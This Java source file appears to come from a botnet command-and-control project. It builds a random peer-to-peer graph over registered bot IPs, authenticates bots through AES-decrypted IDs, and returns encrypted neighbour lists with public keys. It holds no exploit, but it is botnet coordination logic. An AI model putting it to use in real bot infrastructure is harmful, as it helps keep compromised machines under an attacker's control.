package cs.sii.service.connection;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import org.jgrapht.UndirectedGraph;
import org.jgrapht.graph.DefaultEdge;
import org.jgrapht.graph.ListenableUndirectedGraph;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import cs.sii.control.command.MyGnmRandomGraphDispenser;
import cs.sii.control.command.MyVertexFactory;
import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.domain.SyncIpList;
import cs.sii.model.bot.Bot;
import cs.sii.service.crypto.CryptoPKI;
import cs.sii.service.dao.BotServiceImpl;

@Service("P2PMan")
public class P2PMan {

	private UndirectedGraph<IP, DefaultEdge> graph;

	@Autowired
	private BotServiceImpl bServ;

	@Autowired
	private CryptoPKI pki;

	@Autowired
	private NetworkService nServ;

	public UndirectedGraph<IP, DefaultEdge> getGraph() {
		return graph;
	}

	public void setGraph(UndirectedGraph<IP, DefaultEdge> graph) {
		this.graph = graph;
	}

	public void initP2P() {
		graph = createNetworkP2P();
		System.out.println("blab " + graph);
		if(graph.degreeOf(nServ.getMyIp())>0){
			SyncIpList<IP, PublicKey> buf = nServ.getNeighbours();
			buf.setAll(myNeighbours(nServ.getMyIp().getIp()).getList());
			nServ.setNeighbours(buf);
			for (Pairs<IP, PublicKey> p : nServ.getNeighbours().getList()) {
				System.out.println("ip vicinato= " + p.getValue1());
			}
		}
	}

	/**
	 * @param nodes
	 * @return
	 */
	private Integer calculateK(Integer nodes) {
		Integer k = (int) Math.ceil(Math.log10(nodes + 1));
		if (nodes > 3) {
			k++;
		}
		return k;
	}

	/**
	 * @return
	 */
	@SuppressWarnings("unchecked")
	public UndirectedGraph<IP, DefaultEdge> createNetworkP2P() {
		// creo grafo partenza
		graph = new ListenableUndirectedGraph<IP, DefaultEdge>(DefaultEdge.class);
		List<Bot> bots = bServ.findAll();
		System.out.println("idbot peer to peer");

		ArrayList<IP> nodes = new ArrayList<IP>();
		bots.forEach(bot -> nodes.add(new IP(bot.getIp())));
		System.out.println("idbot peer to peer 2");

		MyGnmRandomGraphDispenser<IP, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0,
				new SecureRandom(), true, false);
		System.out.println("idbot peer to peer 3");
		MyVertexFactory<IP> nodeIp = new MyVertexFactory<IP>((List<IP>) nodes.clone(), new SecureRandom());
		System.out.println("idbot peer to peer 4");
		g2.generateConnectedGraph(graph, nodeIp, null, calculateK(nodes.size()));
		System.out.println("idbot peer to peer 5");
		for (IP ip2 : nodes) {
			System.out.println("gli archi di  " + graph.degreeOf(ip2));
		}
		System.out.println("graph" + graph);
		System.out.println("gdegree " + calculateK(nodes.size()));
		return graph;
	}

	/**
	 * @return
	 */
	@SuppressWarnings("unchecked")
	public UndirectedGraph<IP, DefaultEdge> updateNetworkP2P() {

		List<Bot> bots = bServ.findAll();
		ArrayList<IP> nodes = new ArrayList<IP>();

		bots.forEach(bot -> nodes.add(new IP(bot.getIp())));

		MyGnmRandomGraphDispenser<IP, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0,
				new SecureRandom(), true, false);
		ListenableUndirectedGraph<IP, DefaultEdge> graph2 = new ListenableUndirectedGraph<IP, DefaultEdge>(
				DefaultEdge.class);
		MyVertexFactory<IP> nodeIp2 = new MyVertexFactory<IP>((List<IP>) nodes.clone(), new SecureRandom());
		g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0, new SecureRandom(), true, false);
		g2.updateConnectedGraph(graph, graph2, nodeIp2, null, calculateK(nodes.size()));
		for (IP ip2 : nodes) {
			System.out.println("gli archi di  " + graph2.degreeOf(ip2));
		}
		System.out.println("graph" + graph2);
		System.out.println("gdegree " + calculateK(nodes.size()));
		this.graph = graph2;
		
		SyncIpList<IP, PublicKey> buf = nServ.getNeighbours();
		buf.setAll(myNeighbours(nServ.getMyIp().getIp()).getList());
		nServ.setNeighbours(buf);
		return graph;
	}

	/**
	 * @return
	 */
	@SuppressWarnings("unchecked")
	public UndirectedGraph<IP, DefaultEdge> updateNetworkP2P(UndirectedGraph<IP, DefaultEdge> graph) {

		List<Bot> bots = bServ.findAll();
		ArrayList<IP> nodes = new ArrayList<IP>();

		bots.forEach(bot -> nodes.add(new IP(bot.getIp())));

		MyGnmRandomGraphDispenser<IP, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0,
				new SecureRandom(), true, false);
		ListenableUndirectedGraph<IP, DefaultEdge> graph2 = new ListenableUndirectedGraph<IP, DefaultEdge>(
				DefaultEdge.class);
		MyVertexFactory<IP> nodeIp2 = new MyVertexFactory<IP>((List<IP>) nodes.clone(), new SecureRandom());
		g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0, new SecureRandom(), true, false);
		g2.updateConnectedGraph(graph, graph2, nodeIp2, null, calculateK(nodes.size()));
		for (IP ip2 : nodes) {
			System.out.println("gli archi di  " + graph2.degreeOf(ip2));
		}
		System.out.println("graph" + graph2);
		System.out.println("gdegree " + calculateK(nodes.size()));
		this.graph = graph2;
		return graph;
	}

	/**
	 * @param nodes
	 * @return
	 */
	@SuppressWarnings("unchecked")
	public UndirectedGraph<IP, DefaultEdge> updateNetworkP2P(List<Pairs<IP, IP>> edge, List<IP> nodes) {

		MyGnmRandomGraphDispenser<IP, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0,
				new SecureRandom(), true, false);
		ListenableUndirectedGraph<IP, DefaultEdge> graph2 = new ListenableUndirectedGraph<IP, DefaultEdge>(
				DefaultEdge.class);
		MyVertexFactory<IP> nodeIp2 = new MyVertexFactory<IP>((List<IP>) nodes, new SecureRandom());
		// g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0,
		// new SecureRandom(), true, false);
		for (IP ip : nodes) {
			graph.addVertex(ip);
		}
		// controllare se inserire anche arco inverso
		for (Pairs<IP, IP> pair : edge) {
			graph.addEdge(pair.getValue1(), pair.getValue2());
		}
		g2.updateConnectedGraph(graph, graph2, nodeIp2, null, calculateK(nodes.size()));
		for (IP ip2 : nodes) {
			System.out.println("gli archi di  " + graph2.degreeOf(ip2));
		}
		System.out.println("graph" + graph2);
		System.out.println("gdegree " + calculateK(nodes.size()));
		this.graph = graph2;
		return graph;
	}

	/**
	 * @param data
	 * @return
	 * @throws BadPaddingException
	 * @throws IllegalBlockSizeException
	 * @throws InvalidAlgorithmParameterException
	 * @throws UnsupportedEncodingException
	 * @throws NoSuchPaddingException
	 * @throws NoSuchAlgorithmException
	 * @throws InvalidKeyException
	 */
	public byte[] getNeighbours(String data) {
		String idBot;
		Bot bot = null;
		idBot = pki.getCrypto().decryptAES(data);
		if (idBot == null)
			return null;
		System.out.println("id bot " + idBot);
		bot = bServ.searchBotId(idBot);

		if (bot == null) {
			return null;// non autenticato
		} else {
			System.out.println(" bot " + bot.getIp());
			if (graph.containsVertex(new IP(bot.getIp()))) {
				Set<DefaultEdge> neighbours = graph.edgesOf(new IP(bot.getIp()));
				if (neighbours.size() < calculateK(bServ.findAll().size())) {
					updateNetworkP2P();
				}
			} else {
				updateNetworkP2P();
			}
		}

		Set<DefaultEdge> setEd = graph.edgesOf(new IP(bot.getIp()));
		DefaultEdge[] a = new DefaultEdge[setEd.size()];
		setEd.toArray(a);

		ArrayList<Object> ipN = new ArrayList<Object>();
		for (int i = 0; i < a.length; i++) {

			IP s = graph.getEdgeSource(a[i]);
			IP t = graph.getEdgeTarget(a[i]);
			if (!s.equals(new IP(bot.getIp()))) {
				Bot sB = bServ.searchBotIP(s);
				ipN.add(new Pairs<String, String>(sB.getIp(), (sB.getPubKey())));
			}
			if (!t.equals(new IP(bot.getIp()))) {
				Bot tB = bServ.searchBotIP(t);
				ipN.add(new Pairs<String, String>(tB.getIp(), tB.getPubKey()));
			}

		}
		ByteArrayOutputStream ostream = new ByteArrayOutputStream();
		try {
			pki.getCrypto().encrypt(ipN, ostream);
			ByteArrayInputStream kk = new ByteArrayInputStream(ostream.toByteArray());

			if (ipN.equals(pki.getCrypto().decrypt(kk)))
				System.out.println("ggg0");

		} catch (IOException | InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException
				| InvalidAlgorithmParameterException e) {
			System.out.println("fail encrypt neighbours");
		}

		return ostream.toByteArray();
	}

	public SyncIpList<IP, PublicKey> myNeighbours(String data) {

		Set<DefaultEdge> setEd = graph.edgesOf(new IP(data));
		DefaultEdge[] a = new DefaultEdge[setEd.size()];
		setEd.toArray(a);

		SyncIpList<IP, PublicKey> ipN = new SyncIpList<IP, PublicKey>();

		for (int i = 0; i < a.length; i++) {

			IP s = graph.getEdgeSource(a[i]);
			IP t = graph.getEdgeTarget(a[i]);
			if (!s.equals(new IP(data))) {
				Bot sB = bServ.searchBotIP(s);
				Pairs<IP, PublicKey> ps = new Pairs<IP, PublicKey>();
				ps.setValue1(new IP(sB.getIp()));
				System.out.println("nuovi vicini "+sB.getIp());
				ps.setValue2(pki.rebuildPuK(sB.getPubKey()));
				ipN.add(ps);
				// ipN.getList().add(ps);
				// ipN.add(new Pairs<IP, PublicKey>(new
				// IP(sB.getIp()),(pki.rebuildPuK(sB.getPubKey()))));

			}
			if (!t.equals(new IP(data))) {
				Bot tB = bServ.searchBotIP(t);
				Pairs<IP, PublicKey> pt = new Pairs<IP, PublicKey>();
				pt.setValue1(new IP(tB.getIp()));
				System.out.println("nuovi vicini "+tB.getIp());
				pt.setValue2(pki.rebuildPuK(tB.getPubKey()));
				ipN.add(pt);
				// ipN.getList().add(pt);
			}

		}

		return ipN;
	}
	//

}
